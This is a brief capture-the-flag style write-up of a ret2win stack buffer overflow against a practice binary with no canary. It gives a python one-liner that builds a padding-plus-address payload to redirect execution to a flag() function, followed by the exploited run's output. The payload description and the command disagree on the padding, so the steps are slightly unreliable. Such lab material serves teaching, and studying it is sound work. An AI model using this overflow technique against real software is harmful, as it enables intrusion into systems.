In `ret2win` approach, we have to take advantage of `Buffer Overflow` vulnerability to alter the `return address` of function.

See below diagram to understand better.

As this binary has `no canary` so, we can exploit buffer overflow vulnerability to alter memory contents on the `stack`.

Here, our goal would be to modify the `default return address` to address of `flag()` function.

#### Payload creation:
```
payload => 40 [A]s + 8 [B]s + [addr to flag()]

# python3 -c "import sys; sys.stdout.buffer.write( b'A'*40 + b'B'*8 + b'C'*4 +  b'\xc3\x91\x04\x08' )" > payload.txt
```

Let's give a try!
```
# ./vuln < payload.txt 
Overflow me
Exploited!!!!!
Segmentation fault
```
We have exploited the binary and successfully ran `flag()` function!
